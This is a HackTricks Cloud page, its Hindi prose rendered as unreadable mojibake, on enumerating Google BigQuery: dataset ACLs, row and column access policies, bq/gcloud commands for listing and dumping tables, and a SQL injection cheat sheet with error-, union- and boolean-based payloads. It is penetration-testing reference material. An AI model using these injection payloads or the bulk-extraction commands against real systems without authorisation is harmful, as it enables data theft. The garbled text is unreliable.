# GCP - Bigquery Enum

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдХреЛ PRs рдЬрдорд╛ рдХрд░рдХреЗ
* github repos.

</details>

## рдореМрд▓рд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

Google Cloud BigQuery рдПрдХ **рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдкреНрд░рдмрдВрдзрд┐рдд, рд╕рд░реНрд╡рд░рд▓реЗрд╕ рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ рдбреЗрдЯрд╛ рд╡реЗрдпрд░рд╣рд╛рдЙрд╕** рд╣реИ, рдЬреЛ **рдкреЗрдЯрд╛рдмрд╛рдЗрдЯ** рдХреЗ рдбреЗрдЯрд╛ рдкрд░ **рд╡рд┐рд╢реНрд▓реЗрд╖рдг** рдХреА рд╕рдВрднрд╛рд╡рдирд╛рдПрдВ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдмрдбрд╝реЗ рдкреИрдорд╛рдиреЗ рдкрд░ рдбреЗрдЯрд╛рд╕реЗрдЯ рдХреЛ рдХреБрд╢рд▓рддрд╛ рд╕реЗ рд╕рдВрднрд╛рд▓рддрд╛ рд╣реИред рдПрдХ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрд╡рд╛ (PaaS), рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдФрд░ рдЙрдкрдХрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдбреЗрдЯрд╛ рдкреНрд░рдмрдВрдзрди рдХреЛ рдореИрдиреНрдпреБрдЕрд▓ рдирд┐рдЧрд░рд╛рдиреА рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рди рд╣реЛред

рдпрд╣ **ANSI SQL** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреНрд╡реЗрд░реА рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдореБрдЦреНрдп рд╡рд╕реНрддреБрдПрдВ **рдбреЗрдЯрд╛рд╕реЗрдЯ** рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ **рдЯреЗрдмрд▓** рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ SQL **рдбреЗрдЯрд╛** рдХреЛ рд░рдЦрддреЗ рд╣реИрдВред

### рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдПрдХ **Google-рдкреНрд░рдмрдВрдзрд┐рдд рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреБрдВрдЬреА** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рд╣рд╛рд▓рд╛рдВрдХрд┐ рдПрдХ **рдЧреНрд░рд╛рд╣рдХ-рдкреНрд░рдмрдВрдзрд┐рдд рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреБрдВрдЬреА (CMEK)** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред рдбреЗрдЯрд╛рд╕реЗрдЯ рдФрд░ рдбреЗрдЯрд╛рд╕реЗрдЯ рдХреЗ рднреАрддрд░ рдЯреЗрдмрд▓ рдкреНрд░рддрд┐ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреБрдВрдЬреА рдХреЛ рд╕реВрдЪрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

### рд╕рдорд╛рдкреНрддрд┐

рдбреЗрдЯрд╛рд╕реЗрдЯ рдореЗрдВ рдПрдХ **рд╕рдорд╛рдкреНрддрд┐ рд╕рдордп** рдХреЛ рд╕реВрдЪрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рддрд╛рдХрд┐ рдЗрд╕ рдбреЗрдЯрд╛рд╕реЗрдЯ рдореЗрдВ рдирдпрд╛ рдЯреЗрдмрд▓ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реЛ рддреЛ рдЙрд╕реЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рджрд┐рдиреЛрдВ рдХреЗ рдмрд╛рдж рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПред

### рдмрд╛рд╣реНрдп рд╕реНрд░реЛрдд

Bigquery рдЕрдиреНрдп Google рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд╕рд╛рде рдЧрд╣рд░рд╛рдИ рд╕реЗ рдПрдХреАрдХреГрдд рд╣реИред рдмрд╛рдХреЗрдЯреНрд╕, рдкрдм/рд╕рдм, рдЧреВрдЧрд▓ рдбреНрд░рд╛рдЗрд╡, RDS рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдбреЗрдЯрд╛ рд▓реЛрдб рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ...

### рдбреЗрдЯрд╛рд╕реЗрдЯ ACLs

рдЬрдм рдПрдХ рдбреЗрдЯрд╛рд╕реЗрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдЙрд╕реЗ рдПрдХреНрд╕реЗрд╕ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП **ACLs рдЬреЛрдбрд╝реЗ рдЬрд╛рддреЗ рд╣реИрдВ**ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдбреЗрдЯрд╛рд╕реЗрдЯ рдХреЛ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдКрдкрд░ **Owner** рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдиреЗ рдбреЗрдЯрд╛рд╕реЗрдЯ рдмрдирд╛рдпрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ **Owner** рдХреЛ рд╕рдореВрд╣ **projectOwners** (рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рдорд╛рд▓рд┐рдХ), **Writer** рдХреЛ рд╕рдореВрд╣ **projectWriters,** рдФрд░ **Reader** рдХреЛ рд╕рдореВрд╣ **projectReaders** рдХреЛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
```bash
bq show --format=prettyjson <proj>:<dataset>

...
"access": [
{
"role": "WRITER",
"specialGroup": "projectWriters"
},
{
"role": "OWNER",
"specialGroup": "projectOwners"
},
{
"role": "OWNER",
"userByEmail": "gcp-admin@hacktricks.xyz"
},
{
"role": "OWNER",
"userByEmail": "support@hacktricks.xyz"
},
{
"role": "READER",
"specialGroup": "projectReaders"
}
],
...
```
### рддрд╛рд▓рд┐рдХрд╛ рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХрд╛ рдкрд╣реБрдВрдЪ рдирд┐рдпрдВрддреНрд░рдг

**рдПрдХ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЛ рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рдЕрдВрджрд░ рдкрд╣реБрдВрдЪрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ** рд░реЛ рдкрд╣реБрдВрдЪ рдиреАрддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рдеред рдпреЗ [**DDL**](https://cloud.google.com/bigquery/docs/reference/standard-sql/data-definition-language#create\_row\_access\_policy\_statement) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рдЕрдВрджрд░ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред\
рдкрд╣реБрдВрдЪ рдиреАрддрд┐ рдПрдХ рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддреА рд╣реИ рдФрд░ **рдХреЗрд╡рд▓ рдЙрд╕ рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рддреА рдкрдВрдХреНрддрд┐рдпрд╛рдБ** рдЙрд╕ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рджреНрд╡рд╛рд░рд╛ **рдкрд╣реБрдВрдЪрдиреЗ рдпреЛрдЧреНрдп** рд╣реЛрдВрдЧреАред
```sql
# Create
CREATE ROW ACCESS POLICY apac_filter
ON project.dataset.my_table
GRANT TO ('user:abc@example.com')
FILTER USING (region = 'APAC');

# Update
CREATE OR REPLACE ROW ACCESS POLICY
CREATE ROW ACCESS POLICY sales_us_filter
ON project.dataset.my_table
GRANT TO ('user:john@example.com',
'group:sales-us@example.com',
'group:sales-managers@example.com')
FILTER USING (region = 'US');

# Check the Post Exploitation tricks to see how to call this from the cli
```

```bash
# Enumerate row policies on a table
bq ls --row_access_policies <proj>:<dataset>.<table> # Get row policies
```
### рдХреЙрд▓рдо рдПрдХреНрд╕реЗрд╕ рдирд┐рдпрдВрддреНрд░рдг

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

рдбреЗрдЯрд╛ рдПрдХреНрд╕реЗрд╕ рдХреЛ рдХреЙрд▓рдо рд╕реНрддрд░ рдкрд░ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

1. **рдПрдХ рдЯреИрдХреНрд╕реЛрдирдореА рдФрд░ рдиреАрддрд┐ рдЯреИрдЧ рдХреА рдкрд░рд┐рднрд╛рд╖рд╛ рдХрд░реЗрдВ**ред рдЕрдкрдиреЗ рдбреЗрдЯрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдЯреИрдХреНрд╕реЛрдирдореА рдФрд░ рдиреАрддрд┐ рдЯреИрдЧ рдмрдирд╛рдПрдВ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░реЗрдВред [https://console.cloud.google.com/bigquery/policy-tags](https://console.cloud.google.com/bigquery/policy-tags)
2. рд╡реИрдХрд▓реНрдкрд┐рдХ: **рдбреЗрдЯрд╛ рдХреИрдЯрд▓реЙрдЧ рдлрд╛рдЗрди-рдЧреНрд░реЗрдиреНрдб рд░реАрдбрд░ рднреВрдорд┐рдХрд╛ рдХреЛ рдПрдХ рдпрд╛ рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕ рдХреЛ рдкреНрд░рджрд╛рди рдХрд░реЗрдВ** рдЬрд┐рдирдореЗрдВ рд╕реЗ рдПрдХ рдпрд╛ рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рдЖрдкрдиреЗ рдмрдирд╛рдП рд╣реБрдП рдиреАрддрд┐ рдЯреИрдЧ рдкрд░ред
3. **рдЕрдкрдиреЗ рдмрд┐рдЧрдХреНрд╡реЗрд░реА рдХреЙрд▓рдореНрд╕ рдХреЛ рдиреАрддрд┐ рдЯреИрдЧ рджреЗрдВ**ред рдмрд┐рдЧрдХреНрд╡реЗрд░реА рдореЗрдВ, рдкреНрд░рддреНрдпреЗрдХ рдХреЙрд▓рдо рдХреЛ рдЬрд┐рд╕рдореЗрдВ рдЖрдк рдПрдХреНрд╕реЗрд╕ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдЙрд╕реЗ рдПрдХ рдиреАрддрд┐ рдЯреИрдЧ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрдХреАрдорд╛ рдПрдиреЛрдЯреЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
4. **рдЯреИрдХреНрд╕реЛрдирдореА рдкрд░ рдкрд╣реБрдВрдЪ рдирд┐рдпрдВрддреНрд░рдг рд▓рд╛рдЧреВ рдХрд░реЗрдВ**ред рдкрд╣реБрдВрдЪ рдирд┐рдпрдВрддреНрд░рдг рд▓рд╛рдЧреВ рдХрд░рдиреЗ рд╕реЗ рдЯреИрдХреНрд╕реЛрдирдореА рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рд╕рднреА рдиреАрддрд┐ рдЯреИрдЧреЛрдВ рдХреЗ рд▓рд┐рдП рдкрд╣реБрдВрдЪ рдкреНрд░рддрд┐рдмрдВрдз рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИред
5. **рдиреАрддрд┐ рдЯреИрдЧ рдкрд░ рдкрд╣реБрдВрдЪ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░реЗрдВ**ред рдкреНрд░рддреНрдпреЗрдХ рдиреАрддрд┐ рдЯреИрдЧ рдХреЗ рд▓рд┐рдП рдкрд╣реБрдВрдЪ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [рдкрд╣реБрдВрдЪ рдФрд░ рдкрд╣рдЪрд╛рди рдкреНрд░рдмрдВрдзрди](https://cloud.google.com/iam) (IAM) рдиреАрддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред рдпрд╣ рдиреАрддрд┐ рдкреНрд░рддреНрдпреЗрдХ рдХреЙрд▓рдо рдХреЗ рд▓рд┐рдП рдкреНрд░рднрд╛рд╡реА рд╣реИ рдЬреЛ рдиреАрддрд┐ рдЯреИрдЧ рдХреЗ рдЕрдВрддрд░реНрдЧрдд рдЖрддрд╛ рд╣реИред

рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛрдИ рдХреЙрд▓рдо рдбреЗрдЯрд╛ рдХреНрд╡реЗрд░реА рд╕рдордп рдкрд░ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ, BigQuery **рдХреЙрд▓рдо рдиреАрддрд┐ рдЯреИрдЧ рдФрд░ рдЙрд╕рдХреА рдиреАрддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХреГрдд рд╣реИ**ред

{% hint style="success" %}
рд╕рд╛рд░рд╛рдВрд╢ рдХреЗ рд░реВрдк рдореЗрдВ, рдХреБрдЫ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдХреБрдЫ рдХреЙрд▓рдореНрд╕ рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк **рд╕реНрдХреАрдорд╛ рдореЗрдВ рдХреЙрд▓рдо рдореЗрдВ рдЯреИрдЧ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдкрд╣реБрдВрдЪ рдХреЛ рдЯреИрдЧ рдкрд░ рдкрд╣реБрдВрдЪ рд▓рд╛рдЧреВ рдХрд░рдХреЗ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред
{% endhint %}

рдЯреИрдХреНрд╕реЛрдирдореА рдкрд░ рдкрд╣реБрдВрдЪ рдирд┐рдпрдВрддреНрд░рдг рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:
```bash
gcloud services enable bigquerydatapolicy.googleapis.com
```
рдЖрдк рд╕реНрддрдВрднреЛрдВ рдХреЗ рдЯреИрдЧ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
bq show --schema <proj>:<dataset>.<table>

[{"name":"username","type":"STRING","mode":"NULLABLE","policyTags":{"names":["projects/.../locations/us/taxonomies/2030629149897327804/policyTags/7703453142914142277"]},"maxLength":"20"},{"name":"age","type":"INTEGER","mode":"NULLABLE"}]
```
{% endcode %}

### рдЬрд╛рдВрдЪ

{% code overflow="wrap" %}
```bash
# Dataset info
bq ls # List datasets
bq ls -a # List all datasets (even hidden)
bq ls <proj>:<dataset> # List tables in a dataset
bq show --format=prettyjson <proj>:<dataset> # Get info about the dataset (like ACLs)

# Tables info
bq show --format=prettyjson <proj>:<dataset>.<table> # Get table info
bq show --schema <proj>:<dataset>.<table>  # Get schema of a table

# Get entries from the table
bq head <dataset>.<table>
bq query --nouse_legacy_sql 'SELECT * FROM `<proj>.<dataset>.<table-name>` LIMIT 1000'
bq extract <dataset>.<table> "gs://<bucket>/table*.csv" # Use the * so it can dump everything in different files

# Insert data
bq query --nouse_legacy_sql 'INSERT INTO `digital-bonfire-410512.importeddataset.tabletest` (rank, refresh_date, dma_name, dma_id, term, week, score) VALUES (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2019-10-13", 62), (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2020-05-24", 67)'
bq insert dataset.table /tmp/mydata.json

# Get permissions
bq get-iam-policy <proj>:<dataset> # Get dataset IAM policy
bq show --format=prettyjson <proj>:<dataset> # Get dataset ACLs
bq get-iam-policy <proj>:<dataset>.<table> # Get table IAM policy
bq ls --row_access_policies <proj>:<dataset>.<table> # Get row policies

# Taxonomies (Get the IDs from the shemas of the tables)
gcloud data-catalog taxonomies describe <taxonomi-ID> --location=<location>
gcloud data-catalog taxonomies list --location <location> #Find more
gcloud data-catalog taxonomies get-iam-policy <taxonomi-ID> --location=<location>

# Get jobs executed
bq ls --jobs=true --all=true
bq show --location=<location> show --format=prettyjson --job=true <job-id>

# Misc
bq show --encryption_service_account # Get encryption service account
```
{% endcode %}

### BigQuery SQL Injection

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЖрдк рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ: [https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac)ред рдпрд╣рд╛рдБ рдХреБрдЫ рд╡рд┐рд╡рд░рдг рджрд┐рдП рдЬрд╛ рд░рд╣реЗ рд╣реИрдВред

**рдЯрд┐рдкреНрдкрдгрд┐рдпрд╛рдБ**:

* `select 1#from here it is not working`
* `select 1/*between those it is not working*/` рд▓реЗрдХрд┐рди рдХреЗрд╡рд▓ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд╡рд╛рд▓рд╛ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛
* `select 1--from here it is not working`

**рдкрд░реНрдпрд╛рд╡рд░рдг** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ **рдЬрд╛рдирдХрд╛рд░реА** рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдЬреИрд╕реЗ:

* рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛: `select session_user()`
* рдкрд░рд┐рдпреЛрдЬрдирд╛ рдЖрдИрдбреА: `select @@project_id`

рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЛ рдЬреЛрдбрд╝реЗрдВ:

* рд╕рднреА рддрд╛рд▓рд┐рдХрд╛ рдирд╛рдо: `string_agg(table_name, ', ')`

**рдбреЗрдЯрд╛рд╕реЗрдЯ**, **рддрд╛рд▓рд┐рдХрд╛рдПрдВ** рдФрд░ **рдХреЙрд▓рдо** рдирд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

* **рдкрд░рд┐рдпреЛрдЬрдирд╛** рдФрд░ **рдбреЗрдЯрд╛рд╕реЗрдЯ** рдирд╛рдо:
```sql
SELECT catalog_name, schema_name FROM INFORMATION_SCHEMA.SCHEMATA
```
{% endcode %}

* **рдбреЗрдЯрд╛рд╕реЗрдЯ** рдХреЗ **рд╕рднреА рддрд╛рд▓рд┐рдХрд╛рдУрдВ** рдХреЗ **рдХреЙрд▓рдо** рдФрд░ **рддрд╛рд▓рд┐рдХрд╛** рдХреЗ рдирд╛рдо: &#x20;

{% code overflow="wrap" %}
```sql
# SELECT table_name, column_name FROM <proj-name>.<dataset-name>.INFORMATION_SCHEMA.COLUMNS

SELECT table_name, column_name FROM <project-name>.<dataset-name>.INFORMATION_SCHEMA.COLUMNS
```
{% endcode %}

* **рдЗрд╕реА рдкрд░рд┐рдпреЛрдЬрдирд╛ рдореЗрдВ** рдЕрдиреНрдп рдбреЗрдЯрд╛рд╕реЗрдЯ:&#x20;

{% code overflow="wrap" %}
```sql
#┬аSELECT catalog_name, schema_name, FROM <proj-name>.INFORMATION_SCHEMA.SCHEMATA

SELECT catalog_name, schema_name, NULL FROM <project-name>.INFORMATION_SCHEMA.SCHEMATA
```
{% endcode %}

**SQL Injection types:**

* рддреНрд░реБрдЯрд┐ рдЖрдзрд╛рд░рд┐рдд - рдХрд╛рд╕реНрдЯрд┐рдВрдЧ: `select CAST(@@project_id AS INT64)`
* рддреНрд░реБрдЯрд┐ рдЖрдзрд╛рд░рд┐рдд - рд╢реВрдиреНрдп рджреНрд╡рд╛рд░рд╛ рд╡рд┐рднрд╛рдЬрди: `' OR if(1/(length((select('a')))-1)=1,true,false) OR '`
* рд╕рдВрдШ рдЖрдзрд╛рд░рд┐рдд (рдЖрдкрдХреЛ bigquery рдореЗрдВ ALL рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛): `UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#`
* рдмреВрд▓рд┐рдпрди рдЖрдзрд╛рд░рд┐рдд: ``' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#``
* рд╕рдВрднрд╛рд╡рд┐рдд рд╕рдордп рдЖрдзрд╛рд░рд┐рдд - рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдбреЗрдЯрд╛рд╕реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрджрд╛рд╣рд░рдг: ``SELECT * FROM `bigquery-public-data.covid19_open_data.covid19_open_data` LIMIT 1000``

**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг:**

* рд╕рднреА рдлрд╝рдВрдХреНрд╢рди рд╕реВрдЪреА: [https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators](https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators)
* рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рд╡рдХреНрддрд╡реНрдп: [https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting](https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting)

### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди рдФрд░ рдкреЛрд╕реНрдЯ рдЕрдзрд┐рдХрд╛рд░

{% content-ref url="../gcp-privilege-escalation/gcp-bigquery-privesc.md" %}
[gcp-bigquery-privesc.md](../gcp-privilege-escalation/gcp-bigquery-privesc.md)
{% endcontent-ref %}

### рд╕реНрдерд┐рд░рддрд╛

{% content-ref url="../gcp-persistence/gcp-bigquery-persistence.md" %}
[gcp-bigquery-persistence.md](../gcp-persistence/gcp-bigquery-persistence.md)
{% endcontent-ref %}

## рд╕рдВрджрд░реНрдн

* [https://cloud.google.com/bigquery/docs/column-level-security-intro](https://cloud.google.com/bigquery/docs/column-level-security-intro)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)
* github repos.

</details>
